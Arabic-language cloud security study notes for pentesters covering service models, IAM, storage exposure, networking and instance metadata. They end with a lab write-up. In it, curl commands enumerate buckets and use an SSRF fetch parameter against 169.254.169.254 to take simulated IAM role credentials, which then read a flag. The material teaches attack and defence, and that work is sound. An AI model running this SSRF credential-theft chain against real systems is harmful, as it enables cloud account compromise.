# Cloud Security Fundamentals


<img width="1834" height="374" alt="image" src="https://github.com/user-attachments/assets/4bb944dc-7298-4a9e-a40c-b9e388dff3ef" />

---

<details>
  <summary>Cloud Service and Deployment Models</summary>




## 1. الأول: يعني إيه Cloud أصلًا؟

لما تستخدم Cloud، إنت **مش لازم تشتري Server وتحطه عندك**.

بدل كده بتقول لشركة زي AWS:

> "أنا عايز Server / Database / Application، شغّلهولي عندك."

وهنا بيظهر السؤال المهم:

> **مين مسؤول عن إيه؟ أنا ولا الـCloud Provider؟**

وده بالظبط اللي الـ **Service Models + Shared Responsibility Model** بيحددوه.

---

# 2. Service Models

عندنا 3 حاجات أساسية:

### 🟢 IaaS — Infrastructure as a Service

هنا الـCloud Provider بيديك **البنية التحتية الأساسية**:

- VM
    
- Disk
    
- Network
    

وإنت مسؤول عن اللي فوقهم.

مثال:

```text
AWS
 │
 ├── Physical Server       ← AWS
 ├── Hypervisor            ← AWS
 └── EC2 VM                ← إنت بتستخدمها
      │
      ├── Operating System ← إنت
      ├── Web Server       ← إنت
      └── Application      ← إنت
```

يعني كأنك **استأجرت شقة فاضية**.

المبنى موجود، الكهرباء والمياه موجودين، لكن إنت اللي تجهز الشقة.

مثال AWS:

**EC2**

---

### 🟡 PaaS — Platform as a Service

هنا Provider بيعملك جزء أكبر.

هو بيتولى:

- Server
    
- OS
    
- Runtime
    
- Scaling غالبًا
    

وإنت تركز على **الكود بتاعك**.

مثلاً:

```text
AWS
 │
 ├── Server       ← AWS
 ├── OS           ← AWS
 ├── Runtime      ← AWS
 └── Your Code    ← إنت
```

كأنك استأجرت **شقة نص مجهزة**.

مش محتاج تبدأ من الصفر.

أمثلة:

- AWS RDS
    
- AWS Elastic Beanstalk
    
- Azure App Service
    
- Google App Engine
    

---

### 🔵 SaaS — Software as a Service

هنا تقريبًا **كل حاجة جاهزة**.

إنت مجرد User بتدخل تستخدم الـApplication.

```text
Provider
 │
 ├── Infrastructure
 ├── OS
 ├── Runtime
 ├── Application
 └── Maintenance
          ↓
        YOU
       Login
        ↓
       Use
```

زي إنك **دخلت فندق** 😂

مش مهتم مين بنى الفندق ولا مين بيصلح التكييف.

إنت داخل تستخدم الخدمة وخلاص.

مثال:

- Microsoft 365
    
- Google Workspace
    
- Amazon WorkMail
    

---

# 3. Deployment Models

دي حاجة مختلفة شوية.

الـService Model بيسألك:

> **إنت بتستأجر إيه؟**

لكن الـDeployment Model بيسألك:

> **البنية التحتية دي موجودة لمين؟**

عندنا 4 أنواع:

### 🌍 Public Cloud

Infrastructure مشتركة بين customers كتير.

مثلاً:

```text
Cloud Provider
      │
 ┌────┼────┐
 ↓    ↓    ↓
You  Company A  Company B
```

كل واحد معزول عن التاني باستخدام security controls زي virtualization/network isolation.

---

### 🏢 Private Cloud

Infrastructure مخصصة **لمنظمة واحدة**.

ممكن تكون عند الشركة نفسها أو hosted عند provider.

```text
Company
   │
   └── Private Cloud
```

---

### 🔀 Hybrid Cloud

جزء عندك و جزء Public Cloud.

مثلاً:

```text
On-Premises
    │
    │ VPN / Private Link
    │
    ↓
Public Cloud
```

وده منتشر جدًا في الشركات الكبيرة.

---

### 👥 Community Cloud

Infrastructure مشتركة بين مجموعة organizations عندهم **requirements متشابهة**.

مثلاً جهات حكومية أو organizations في regulated industry.

---

# 4. أهم جزء: Shared Responsibility Model ⭐⭐⭐⭐⭐

دي ركز فيها جدًا لأنها **أساسية في Cloud Security**.

الفكرة ببساطة:

> **AWS مش هتحمي كل حاجة مكانك. وإنت مش مسؤول عن كل حاجة.**

كل واحد عليه جزء.

مثلاً في AWS EC2:

AWS مسؤولة عن:

```text
Physical Datacenter
Hardware
Hypervisor
```

إنت مسؤول عن:

```text
Operating System
Web Server
Application
Data
Users
Permissions
```

---

## مثال عملي 🔥

إنت عامل EC2:

```text
EC2
 │
 ├── Ubuntu
 ├── Apache
 ├── Website
 └── Database
```

لو حد دخل على الـData Center نفسه وسرق الـServer:

**دي مسؤولية AWS.**

لكن لو إنت سايب:

```text
username: admin
password: admin
```

وبسبب كده attacker دخل الـVM:

**دي مسؤوليتك.**

ولو عامل S3 bucket:

```text
Public Access = ON
```

والـbucket فيه بيانات customers:

**دي برضه مسؤوليتك.**

---



|الحاجة|IaaS|PaaS|SaaS|
|---|---|---|---|
|Physical Hardware|Provider|Provider|Provider|
|Hypervisor|Provider|Provider|Provider|
|Network|Customer|Shared|Provider|
|OS|**Customer**|Provider|Provider|
|Runtime|**Customer**|Provider|Provider|
|Application|**Customer**|**Customer**|Provider|
|Data|**Customer**|**Customer**|**Customer**|
|Identities/Permissions|**Customer**|**Customer**|**Customer**|

### المفتاح:

كل ما تروح من:

**IaaS → PaaS → SaaS**

الـProvider يشيل مسؤوليات أكتر منك.

لكن:

> **Data + Identity + Access Control**  
> غالبًا تفضل مسؤوليتك.

---

# 6. وده بقى المهم بالنسبة لنا كـPentesters 🕵️

إحنا مش غالبًا هنروح نختبر:

```text
Hypervisor
Physical Server
Datacenter
```

لأن دي مسؤولية الـProvider ومش هي دي نقطة الـengagement العادية.

إحنا بندور على أخطاء العميل عملها.

مثلاً:

### ❌ EC2

```text
Default password
```

### ❌ S3

```text
Bucket = Public
```

### ❌ IAM

```text
Action = *
Resource = *
```

يعني User عنده صلاحيات زيادة جدًا.

وده مثال مهم:

```json
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}
```

يعني تقريبًا:

> "اعمل اللي إنت عايزه في أي Resource."

وده نوع من الـ**misconfiguration** اللي الـCloud Pentester يهتم بيه جدًا.

---

# 7. Provider Callouts

آخر جدول بس بيقولك:

**نفس فكرة الـService Model، لكن كل Cloud Provider عنده أسماء مختلفة.**

مثلاً:

|Model|AWS|Azure|Google Cloud|
|---|---|---|---|
|IaaS|EC2|Azure VM|Compute Engine|
|PaaS|RDS / Elastic Beanstalk|Azure SQL / App Service|Cloud SQL / App Engine|
|SaaS|Amazon WorkMail|Microsoft 365|Google Workspace|

يعني لو قابلت:

> **EC2**

افتكر:

**AWS → IaaS**

ولو قابلت:

> **RDS**

افتكر:

**AWS → Managed Database → PaaS**

---




  
</details>













<details>
  <summary>Identity and Access Management (IAM)</summary>




## 1. IAM ببساطة يعني إيه؟

**IAM = Identity and Access Management**

يعني النظام اللي بيحدد:

> **مين؟ يقدر يعمل إيه؟ على إيه؟**

مثال:

```text
Ahmed
  ↓
Can read
  ↓
S3 Bucket
```

يعني Ahmed يقدر يقرأ ملفات الـBucket.

---

# 2. الـPolicy عبارة عن JSON

الـPolicy ببساطة ورقة تعليمات بتقول:

```text
Effect   → يسمح ولا يمنع؟
Action   → يعمل إيه؟
Resource → يعمل ده على إيه؟
```

مثال:

```json
{
  "Effect": "Allow",
  "Action": "storage:GetObject",
  "Resource": "bucket/reports/*"
}
```

اقرأها كده:

> **Allow** → اسمح  
> **GetObject** → بقراءة object  
> **reports/** → داخل الـreports  
> ***** → أي object جوه الـreports

يعني صلاحية محدودة جدًا.

---

# 3. طب إيه خطورة الـ`*`؟ ⭐

بص على دي:

```json
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}
```

اقرأها:

```text
Action   = *
```

يعني:

> اعمل أي Action

و:

```text
Resource = *
```

يعني:

> على أي Resource

فبالتالي:

> **اعمل أي حاجة على أي حاجة.**

وده اسمه **Over-permissive Policy**.

وده من أول الحاجات اللي عايزك تدور عليها لما تشوف IAM Policy.

---

# 4. Roles بقى

الـ**Role** فكرته بسيطة:

بدل ما أدي User مليون Permission بشكل دائم، أعمل Role فيه الصلاحيات المطلوبة.

مثلاً:

```text
Developer
   ↓
Assume
   ↓
DeveloperRole
   ↓
Permissions
```

لما يعمل **Assume Role**، الـCloud Provider يديه **Temporary Credentials** مرتبطة بالـRole ده.

يعني الـCredentials دي مش بالضرورة دائمة.

---

# 5. ليه إحنا كـPentesters نهتم بالـRoles؟ 🔥

هنا تبدأ قصة **Privilege Escalation**.

افترض إنك حصلت على Credentials لـUser عادي:

```text
LowPrivUser
```

ولقيت إنه يقدر يعمل:

```text
AssumeRole
      ↓
AdminRole
```

يبقى:

```text
Low Privilege
      ↓
Assume Role
      ↓
Higher Privilege
```

وده ممكن يكون **Privilege Escalation Path**.

---

# 6. Instance Metadata Service

دي نقطة مهمة جدًا، خصوصًا في AWS.

افترض عندك:

```text
EC2
 │
 └── IAM Role
       ↓
 Temporary Credentials
```

الـEC2 ممكن يكون عنده Role.

لو حصل SSRF ووصلت للـ**Instance Metadata Service**، ممكن في بعض السيناريوهات تستخرج temporary credentials الخاصة بالـRole.

فالمسار ممكن يبقى:

```text
SSRF
 ↓
Metadata Service
 ↓
Temporary Credentials
 ↓
IAM Role
 ↓
Cloud Permissions
```

وده سبب إن **SSRF في Cloud environment** ممكن تكون أخطر بكتير من SSRF عادية.

---

# 7. لما تلاقي Credentials تعمل إيه؟

دي أهم عقلية في الجزء ده.

مش أول حاجة تقول:

> "إزاي أعمل exploit؟"

أول سؤال:

> **What can I do with these credentials?**

وتبدأ تسأل:

### 1️⃣ مين صاحب الـCredentials؟

```text
Who am I?
```

### 2️⃣ إيه الـPolicies بتاعته؟

```text
What permissions do I have?
```

### 3️⃣ هل يقدر يعمل Assume Role؟

```text
What roles can I assume?
```

### 4️⃣ هل فيه `*`؟

```text
Action: *
Resource: *
```

### 5️⃣ الصلاحيات على إيه؟

هل:

```text
Resource = specific bucket
```

ولا:

```text
Resource = *
```

---

# 8. أهم Attack Pattern في الجزء كله ⭐⭐⭐⭐⭐

احفظ الجملة دي:

> **Exposed Credentials + Over-permissive IAM = Dangerous Combination**

مثلاً:

Developer يحط AWS credentials بالغلط على GitHub:

```text
Access Key
Secret Key
```

الـAttacker ياخدهم.

لو الـUser عنده:

```json
"Action": "*",
"Resource": "*"
```

فالمشكلة مش مجرد إن الـKey اتسرب.

المشكلة إن:

```text
Leaked Credentials
        +
Over-permissive Policy
        ↓
Cloud Account Compromise
```

---

# 9. الـCredentials ممكن تتسرب فين؟

الجزء ذكر أمثلة مهمة:

```text
Public GitHub Repository
        ↓
AWS Keys
```

أو:

```text
Public Docker Image
        ↓
Credentials
```

أو:

```text
Public S3 Bucket
        ↓
Config File
        ↓
Credentials
```

أو حتى:

```text
Screenshot
        ↓
Access Key ظاهر
```

يعني أثناء الـCloud Pentest، **Secret Hunting** حاجة مهمة جدًا.

---



بس عشان تعرف إن كل Provider عنده أسماء مختلفة:

|الفكرة|AWS|Azure|Google|
|---|---|---|---|
|Identity|IAM|Entra ID|Cloud IAM|
|Credentials|Access Key + Secret|Client ID + Secret|Service Account Key|
|Role|IAM Role|Managed Identity|Service Account|

فلو الماشين قالتلك:

> **IAM Role**

افتكر AWS.

ولو قالت:

> **Managed Identity**

افتكر Azure.

ولو قالت:

> **Service Account**

افتكر Google Cloud.

---






  
</details>












<details>
  <summary>Cloud Storage and Data Exposure</summary>



## 1. يعني إيه Object Storage؟

ببساطة، تخيل عندك **دولاب كبير على الإنترنت**.

الدولاب ده فيه:

```text
Bucket
 ├── image.jpg
 ├── backup.zip
 ├── database.sql
 ├── .env
 └── logs.txt
```

الـ**Bucket** = الحاوية الكبيرة.

والـ**Object** = الملف اللي جواها.

في AWS:

```text
Bucket → S3 Bucket
Object → File
```

---

# 2. أهم 3 حاجات بتتحكم في الوصول

### ① Bucket Policy

دي Policy بتحدد:

> مين يقدر يعمل إيه على الـBucket؟

مثلاً:

```text
Allow → Read
Principal → Everyone
```

لو مكتوب:

```json
"Principal": "*"
```

دي معناها:

> **أي حد**.

ودي حاجة لازم عينك تتعود عليها.

---

### ② ACL

**Access Control List**

دي طريقة أقدم للتحكم في صلاحيات الملفات/الـObjects.

مثلاً:

```text
file.txt
   ↓
Public Read
```

يعني أي حد ممكن يقرأ الملف.

---

### ③ Signed / Pre-signed URL

دي مهمة جدًا.

تخيل عندك ملف **Private**، لكن عايز تبعته لشخص بدون ما تديله Credentials.

بتعمل Link مؤقت:

```text
https://bucket/file.pdf?signature=....
```

اللينك يشتغل لمدة معينة:

```text
1 hour
```

بعدها ينتهي.

المشكلة لو:

```text
Expiry = 5 years
```

أو الـURL نفسه اتسرب.

يبقى أي حد معاه اللينك يقدر يستخدمه خلال الفترة دي.

---

# 3. إزاي الـBucket بيبقى Public؟

أربع طرق مهمين:

### 🔴 1. Developer نسي يقفله

عمل Bucket للتجربة:

```text
Dev Bucket
   ↓
Public
```

وبعدها حط عليه بيانات حقيقية ونسي يقفله.

---

### 🔴 2. Block Public Access متقفل

Cloud Providers عندهم protections تمنع الـPublic Access.

لو حد عطّلها:

```text
Block Public Access
       ↓
      OFF
```

ممكن Policy كانت هتتمنع قبل كده إنها تشتغل.

---

### 🔴 3. `Principal: "*"`

مثلاً:

```json
{
  "Effect": "Allow",
  "Principal": "*",
  "Action": "s3:GetObject"
}
```

معناها:

> أي حد يقدر يعمل GetObject.

ودي واضحة جدًا كـred flag.

---

### 🔴 4. Signed URL طويل جدًا

مثلاً:

```text
Signed URL
    ↓
Valid for 5 years
```

لو اللينك اتسرب، عندك مشكلة كبيرة.

---

# 4. طيب إحنا كـPentesters ندور إزاي؟ 🕵️

الفكرة هنا مش exploit معقد.

إحنا بنعمل **Enumeration**.

### Step 1 — نخمّن اسم الـBucket

لو الشركة اسمها:

```text
example
```

نجرب أسماء منطقية:

```text
example-backups
example-dev
example-prod
example-assets
example-storage
```

---

### Step 2 — نجرب الـEndpoint

لو لقينا:

```text
example-backups
```

نشوف هل الـBucket موجود وهل Public ولا لأ.

---

### Step 3 — نحاول List

لو الـBucket بيسمح بالـListing:

```text
Bucket
 ├── backup.zip
 ├── .env
 ├── database.sql
 └── config.json
```

هنا الموضوع بقى interesting جدًا.

---

### Step 4 — نشوف الملفات المهمة

مش كل صورة أو CSS file بنفس الأهمية.

نركز على:

```text
backup.sql
database.zip
.env
credentials.json
config.yaml
kubeconfig
logs.zip
```

---

# 5. إيه أخطر حاجة ممكن تلاقيها؟ ⭐

### Backup

دي من أخطر الحاجات.

مثلاً:

```text
database-backup.sql
```

ممكن تحتوي على:

```text
Users
Emails
Passwords hashes
API keys
Tokens
Sensitive data
```

يعني ملف واحد ممكن يديك كمية معلومات ضخمة.

---

# 6. Source Code

ممكن تلاقي:

```text
source.zip
```

وتلاقي جواه:

```text
config.js

API_KEY=...
AWS_SECRET=...
DB_PASSWORD=...
```

وده ممكن يتحول من:

```text
Public Bucket
      ↓
Secret
      ↓
Cloud Credentials
      ↓
Cloud Account
```

🔥

---

# 7. Logs

الـLogs أحيانًا الناس بتستهين بيها.

ممكن تحتوي على:

```text
Emails
Internal IPs
Session tokens
URLs
Error messages
```

وأحيانًا credentials ظهرت بالغلط في error.

---

# 8. أهم Provider Mapping

احفظ دول:

|Cloud|Storage|
|---|---|
|AWS|**S3**|
|Azure|**Blob Storage**|
|Google|**Cloud Storage**|

والوحدات:

```text
AWS       → Bucket
Azure     → Container
Google    → Bucket
```

---



  
</details>










<details>
  <summary>Cloud Networking</summary>



## 1. VPC / Virtual Network

دي ببساطة **شبكة خاصة جوه الـCloud**.

تخيل شركة عندها شبكة:

```text
VPC
│
├── Web Server
├── App Server
└── Database
```

الشبكة دي معزولة عن باقي العملاء.

---

## 2. Subnet

الـSubnet = **جزء من الـVPC**.

ممكن يكون عندك:

```text
VPC
│
├── Public Subnet
│    └── Web Server
│
└── Private Subnet
     └── Database
```

### Public Subnet

عنده طريق للإنترنت عن طريق **Internet Gateway**.

يعني ممكن يكون فيه Server accessible من الإنترنت.

### Private Subnet

مفيش طريق مباشر من الإنترنت للـresources الموجودة فيه.

غالبًا تحط فيه:

```text
Database
Internal Services
```

وده أفضل من إنك تعرض الـDatabase مباشرة للإنترنت.

---

# 3. Security Group ⭐

اعتبرها **Firewall على مستوى الـInstance**.

مثلاً:

```text
EC2
 ↓
Security Group
 ↓
Allow TCP 22 from 1.2.3.4
```

يعني SSH مسموح بس من IP معين.

والـSG:

- **Stateful**
    
- Rules بتعمل **Allow**
    
- الـdefault عمليًا deny لو مفيش rule تسمح بالترافيك.
    

### Stateful يعني إيه؟

لو:

```text
You → Server
     HTTP Request
```

والـrequest مسموح، فالـresponse يرجع تلقائيًا.

مش محتاج تعمل Rule منفصلة للـresponse.

---

# 4. NACL

دي Firewall على مستوى **Subnet** مش Instance.

والفرق المهم:

|Security Group|NACL|
|---|---|
|Instance level|Subnet level|
|Stateful|Stateless|
|Allow فقط|Allow + Deny|
|أساسي جدًا|Coarser / safety layer|

**Stateless** يعني لازم تفكر في الاتجاهين.

---

# 5. أهم حاجة كـPentester: Exposed Ports 🔥

أكبر Red Flag:

```text
0.0.0.0/0
```

معناها:

> **أي IP على الإنترنت.**

مثلاً:

```text
TCP 22
Source: 0.0.0.0/0
```

يعني SSH مفتوح للعالم كله.

أو:

```text
3306 → 0.0.0.0/0
```

يبقى MySQL exposed.

وأمثلة تانية:

```text
5432 → PostgreSQL
27017 → MongoDB
3389 → RDP
8080/9000 → Admin Panels
```

مش معنى إن Port مفتوح إن فيه vulnerability، لكن **الـexposure نفسه misconfiguration محتملة** حسب الـbusiness requirement.

---

# 6. Lateral Movement ⭐⭐⭐

دي أهم نقطة بعد ما تدخل الجهاز.

مثلاً:

```text
Internet
   ↓
Web Server
   ↓
Internal Network
   ├── Database
   ├── Redis
   ├── App Server
   └── Admin Panel
```

إنت دخلت Web Server.

السؤال مش:

> "خلصت؟"

السؤال:

> **"إيه تاني أقدر أوصله من هنا؟"**

ممكن الـWeb Server يقدر يوصل مباشرة للـDatabase أو Internal Admin Panel.

وده اسمه:

**Lateral Movement**

يعني تتحرك من جهاز compromised لجهاز أو resource تاني داخل البيئة.

---




  
</details>





<details>
  <summary>Compute and Metadata Services</summary>




## 1. Instance يعني إيه؟

الـ**Instance** ببساطة = VM شغالة على الـCloud.

يعني نفس اللي اتعلمناه في Linux/Windows:

```text
Cloud
 ↓
EC2 Instance
 ↓
Linux
 ↓
Apache / SSH / App
```

فكل مهاراتك القديمة لسه شغالة:

- Open ports
    
- Weak passwords
    
- Vulnerable services
    
- Unpatched OS
    
- Misconfigured applications
    

الجديد بقى هو **Metadata Service**.

---

# 2. Instance Metadata Service — IMDS ⭐⭐⭐⭐⭐

دي أهم حاجة.

كل Cloud VM عندها endpoint داخلي تقدر تسأل منه:

> "أنا مين؟ وإيه الـconfiguration بتاعتي؟ وهل عندي Credentials؟"

في AWS:

```text
169.254.169.254
```

وده عنوان **داخلي** مش المفروض يكون accessible مباشرة من الإنترنت.

ممكن الـVM تسأله عن معلومات زي:

```text
Instance ID
Region
Startup configuration
IAM Role
Temporary Credentials
```

وأهم حاجة بالنسبة لنا:

> **Temporary Credentials الخاصة بالـIAM Role.**

---

# 3. ليه الـIMDS موجود أصلاً؟

عشان الـApplication نفسها محتاجة تعرف هويتها أو تستخدم AWS resources.

بدل ما المطور يعمل:

```text
AWS_ACCESS_KEY = hardcoded
AWS_SECRET = hardcoded
```

الـApplication تاخد الـtemporary credentials من الـIMDS وقت الحاجة.

ده أحسن أمنيًا من hardcoding.

**لكن...**

لو attacker قدر يوصل للـIMDS؟

ممكن ياخد نفس الـCredentials.

---

# 4. IMDSv1 vs IMDSv2 🔥

### IMDSv1

بسيطة جدًا:

```text
HTTP GET
   ↓
Metadata
   ↓
Credentials
```

مفيش session token مطلوب.

وده اللي بيخليها خطيرة جدًا مع **SSRF**.

---

### IMDSv2

لازم تعمل خطوة إضافية للحصول على **session token** باستخدام PUT، وبعدها تستخدم الـtoken في طلبات metadata.

بالتالي:

```text
SSRF
 ↓
GET IMDS
 ↓
❌ محتاج Token
```

وده بيصعّب استغلال SSRF للوصول للـIMDS.

---

# 5. أهم Attack Chain في الجزء 🔥🔥

دي احفظها كويس:

```text
SSRF
 ↓
IMDS
 ↓
IAM Role Credentials
 ↓
AWS API
 ↓
Cloud Resources
```

مثلاً عندك Web App فيها SSRF:

```text
Attacker
   ↓
Web Application
   ↓
"Fetch this URL"
   ↓
169.254.169.254
```

الـServer هو اللي بيعمل request للـIMDS لأنه موجود داخل الـVM.

لو التطبيق رجعلك الـresponse:

```text
AccessKeyId
SecretAccessKey
Token
Expiration
```

أنت كده حصلت على **temporary credentials للـRole اللي الـInstance شغالة بيه**.

---

# 6. وهنا يحصل Privilege Escalation

مثلاً:

```text
Web App
   ↓
SSRF
   ↓
IMDS
   ↓
WebServerRole
   ↓
AWS Credentials
```

لو الـ`WebServerRole` عنده صلاحيات واسعة:

```text
S3
Secrets
IAM
EC2
...
```

فأنت ممكن تنتقل من:

```text
Web Vulnerability
       ↓
Cloud Identity
       ↓
Cloud Permissions
```

وده السبب إن SSRF في Cloud environment ممكن تكون **أخطر بكتير** من SSRF عادية.

---

# 7. ليه الـRole Name مهم؟

المسار اللي النص بيذكره:

```text
/latest/meta-data/iam/security-credentials/
```

ممكن يرجع اسم الـRole.

بعدها تستخدم اسم الـRole للوصول للـcredentials الخاصة به.

يعني الفكرة:

```text
Metadata
  ↓
What's my role?
  ↓
Role Name
  ↓
Credentials
```

---

# 8. باقي الـCompute Forms

مش كل Cloud Compute عبارة عن VM.

### 💾 Disk Snapshot

Snapshot = نسخة من Disk في لحظة معينة.

لو Public:

> كأنك نشرت Hard Drive على الإنترنت.

وممكن يحتوي:

```text
Configs
SSH keys
Passwords
Source code
Sensitive data
```

---

### ⚡ Serverless

زي:

```text
AWS Lambda
Azure Functions
Google Cloud Functions
```

بدل ما تدير VM، إنت ترفع Function والـCloud يشغلها عند الحاجة.

---

### 📦 Containers

زي:

```text
AWS ECS / EKS
Azure ACI / AKS
Google Cloud Run / GKE
```

والفكرة المهمة:

> الـContainer برضه ممكن يكون له Identity وMetadata، وبالتالي SSRF ممكن تدخلنا في نفس النوع من الـattack chain، لكن التفاصيل والـendpoints تختلف.

---



  
</details>






<details>
  <summary>Practical, Attacking a Cloud-Like Environment</summary>


## Step 1: Network Reconnaissance

```
nmap 10.112.130.210
```

<img width="1220" height="377" alt="image" src="https://github.com/user-attachments/assets/d3680117-73a1-418e-9f42-0c963e307a77" />

> ### The scan shows ports 8080 and 9000. Port `9000` is the object-storage service. Port `8080` is a small web application called ImageFetcher. That application is our SSRF candidate.


## Step 2: Public Bucket Enumeration

```
curl http://10.112.130.210:9000/
```

<img width="1108" height="133" alt="image" src="https://github.com/user-attachments/assets/dd948612-b981-4856-93f3-107dfd29ace5" />


> ### The root shows two buckets, `dev-assets` and `prod-secrets`. The `dev-assets` bucket is listable.


```
curl http://10.112.130.210:9000/dev-assets/
```


<img width="1138" height="159" alt="image" src="https://github.com/user-attachments/assets/998f0cf2-ffdf-459e-ba3e-dcb436d3a747" />


> A file named dev-notes.txt stands out in the listing. Let's read it.

```
curl http://10.112.130.210:9000/dev-assets/dev-notes.txt
```

<img width="1451" height="465" alt="image" src="https://github.com/user-attachments/assets/ca06b08b-c721-4d0b-93d9-375f0d1cc212" />


> ### The note tells us about the ImageFetcher app on port 8080 and mentions it has a URL-fetch feature at /fetch?url=. It also mentions the role name attached to the instance:web-app-role. That is the piece we need for the next step.


## Step 3: SSRF Against the Metadata Service

The ImageFetcher app fetches any URL we give it and returns the response body. That is exactly the primitive we need to reach the metadata service at 169.254.169.254. Point the URL parameter at the IAM credentials path for the web-app-role role.

```
curl "http://10.112.130.210:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-role"
```

<img width="1386" height="416" alt="image" src="https://github.com/user-attachments/assets/95d827cb-c252-409c-b226-4844a0b138c5" />

```json
{
  "Code": "Success",
  "LastUpdated": "2026-01-01T00:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIATHM1234FAKEKEY0",
  "SecretAccessKey": "fakeSECRET/fakeSECRETKEYsim0lab0web0app0role",
  "Token": "FQoGZXIvYXdzEMn//////////wEaDEXAMPLEsimulatedTokenStringForTheLab==",
  "Expiration": "2099-12-31T23:59:59Z",
  "RoleArn": "arn:aws:iam::000000000000:role/web-app-role"
}

```

> ### The response is a JSON document containing AccessKeyId, SecretAccessKey, Token, and Expiration fields. The `AccessKeyId` is the value we need to hold onto.


## Step 4: Read the IAM Policy

The storage service has an admin endpoint that returns the IAM policy attached to our role, but it requires a valid token. In this simulator, the token is carried in the X-Simulated-Token header. Pass the access key we just acquired.

```
curl -H "X-Simulated-Token: AKIATHM1234FAKEKEY0" http://10.112.130.210:9000/admin/policy.json
```

<img width="1243" height="380" alt="image" src="https://github.com/user-attachments/assets/4c4e274b-139b-4ee6-8c95-a9dbc948dc39" />

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "WildcardStorageAccess",
      "Effect": "Allow",
      "Action": "storage:*",
      "Resource": "bucket/prod-secrets/*"
    }
  ]
}

```

<img width="1560" height="141" alt="image" src="https://github.com/user-attachments/assets/0537d76d-3fc7-45cc-82e3-57297ab3cab0" />

---

## Step 5: Retrieve the Flag


```
curl -H "X-Simulated-Token: AKIATHM1234FAKEKEY0" http://10.112.130.210:9000/prod-secrets/flag.txt
```

<img width="1134" height="230" alt="image" src="https://github.com/user-attachments/assets/7d1a690a-aba2-4064-9d57-1c0e13017981" />




  
</details>












































